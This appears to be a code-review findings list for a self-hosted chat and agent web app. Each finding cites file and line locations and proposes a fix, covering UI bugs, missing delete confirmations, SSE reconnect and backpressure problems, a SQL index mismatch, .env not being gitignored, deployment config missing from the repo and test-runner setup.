- **Token counts divided by 1024 in two places and 1000 everywhere else.**
  `ModelPicker.svelte:161` uses `/1000` and `:165` uses `/1024` four lines later, so a
  128,000-token remote model reads "128k" and an identical local one reads "125k".
  `ContextBar.svelte:10-11` mismatches numerator and denominator *inside one string*, while the
  bar fill uses raw values — so the text and the bar disagree. Tokens aren't bytes; 1024 is
  wrong in both. **Fix:** one `kTokens()` helper, delete the three re-implementations.

- **`SpeechPanel` reports all eleven failure paths as neutral info toasts** — `toast(e.message)`
  with no `kind`, so a dead speech engine, denied mic permission and a successful voice clone
  render identically. Three competing error-extraction idioms across components
  (`String(e.error ?? e.message ?? e)`, `err.message ?? 'literal'`, bare `e.message`), the last
  of which renders `undefined` for any non-api() rejection. **Fix:** one `toastError(err,
  fallback)` in `toast.svelte.js`. **[unverified]**

- **Three destructive actions skip the confirm dialog** every other delete path uses:
  `forgetMemory` (a bare 12px X in a dense row — deletes a durable memory with no undo),
  `revokeInvite` (immediately adjacent to the harmless "copy" button), and `resetAll` (sitting
  directly left of "Save changes" — the classic adjacency trap; wipes every appearance and
  behaviour preference). **Fix:** wrap all three in the existing `confirmDialog` with
  `danger: true`. **[unverified]**

- **Conversation rows nest `<button>` inside `<a>`** (`Sidebar.svelte:234-258`), which the HTML
  parsing spec disallows; browsers recover inconsistently and the nested rename/delete buttons'
  accessibility-tree exposure isn't dependable. The `role="link"` on the anchor is redundant.
  The deep-search results use `role="button"` but only handle Enter, not Space. **Fix:**
  restructure as a flex row with a sibling `<a>` plus two buttons; add `aria-label` including
  the chat title. **[unverified]**

- **Agent-run SSE replays the whole event history on every reconnect.** `agent.js:860-883`
  supports `?after=` but never emits SSE `id:` lines, and `RunReplay.svelte:18` opens without
  one — so every tunnel blip re-sends `agent_events` from id 0, including ~80KB diff rows. The
  UI survives because it dedupes on `e.id`. **Fix:** emit `id:`, read `last-event-id`, and have
  the client reopen with `?after=`.

- **SSE writers ignore backpressure entirely.** `chatPost.js:95-98`, `chat.js:157-162` and
  `agent.js:870` all discard `reply.raw.write()`'s return value and never listen for `'drain'`.
  `image_preview` events carry base64 PNG frames per denoise step. A client that stalls without
  closing TCP never fires `'close'`, so the listener is never removed and generation continues —
  Node buffers the whole stream in memory, unbounded, per listener. **Fix:** track a `backedUp`
  flag per listener; drop lossy events (`delta`, `thinking`, `image_preview`, `tok_s`) while
  backed up and keep state-carrying ones.

- **Cost ledger sorts the user's entire history to return 50 rows.** `costs.js:148-155` does
  `ORDER BY e.id DESC` but the only user index is `(user_id, created_at DESC)`, so SQLite adds a
  temp B-tree. **Fix:** one word — `ORDER BY e.created_at DESC, e.id DESC` — which the existing
  index satisfies directly. **[unverified]**

- **The client re-measures context after every turn** for a number it already has:
  `chatPost.js:655-659` sends a `context` event and `Chat.svelte:316` applies it, then
  `endStream` calls `refreshContext()` unconditionally at `:527` and `:578`. That endpoint
  rebuilds the whole prompt and POSTs it back to llama-server to be re-tokenized — right as the
  user is most likely to send the next message. **Fix:** flag that a `context` event arrived and
  skip the refetch; keep it only for aborted turns and cache replays. **[unverified]**

- **`.gitignore` doesn't cover `.env`.** Confirmed with `git check-ignore` — neither `.env` nor
  `server/.env` is ignored. None exists today and there's no `dotenv` dep, so vars come from the
  systemd unit — but `server/src` reads 35+ `process.env.*` settings and the README presents them
  as a plain list with no statement of where they're set. The natural response to "set
  DIFFUSION_CLI" is to write `server/.env`, on a box that also holds provider keys and PATs.
  One-line preventable leak. **Fix:** add `.env`, `.env.*`, `!.env.example` now; commit a
  `server/.env.example`; say in the README where these are actually set.

- **The systemd units that define the deployment aren't in the repo.** `duckpond.service` and
  `duckpond-deploy.timer` are referenced by README and deploy.sh but exist nowhere in the tree —
  so the only record of every env var's value, the `Restart=` policy, `WorkingDirectory`, and the
  timer interval is on the box itself. Combined with the missing DB backup, a disk failure loses
  both data and configuration. **Fix:** commit them under `deploy/systemd/` with secrets in an
  `EnvironmentFile=`, plus an install snippet in the README. **[unverified]**

- **No dependency audit anywhere.** No `npm audit` in the repo or the deploy path, no CI, no
  Dependabot. `marked` and `mermaid` both process untrusted model output client-side; fastify and
  @fastify/cookie sit on the auth path. Caret ranges on `argon2`, `better-sqlite3` and `fastify`
  are held in place only by the committed lockfile — which `npm install` (not `ci`) is exactly
  the command that can resolve past. **Fix:** `npm ci` in deploy.sh, pin the three
  security-sensitive deps exactly, and run `npm audit --audit-level=high` on a weekly timer off
  the critical deploy path. **[unverified]**

- **Dead conditional in the chat `finally`.** `chatPost.js:748-750` — both branches of the
  `job.finalMsg` ternary are character-for-character identical, so it reduces to
  `aborted ? 'stopped' : (job.state.error ? 'error' : 'done')`. Worth deciding rather than
  collapsing: a turn that errors in the auto-title/follow-up/memory tail (`:663-712`) *after*
  delivering a reply arguably should report `done`, and that intent is invisible here.

- **The test script short-circuits and hand-rolls its own runner.**
  `"test": "node test/contextsaver.test.mjs && node test/reasoning.test.mjs"` — one failing
  assertion in the first suite means the second never runs, and each file reimplements the same
  `let fails = 0` / `process.exit(fails ? 1 : 0)` block. Adding the permissions and github suites
  means copying it a third time and editing the string. **Fix:** `"test": "node --test test/"`
  with `node:test` + `node:assert/strict` — new files are picked up automatically and the TAP
  output feeds the CI summary directly.
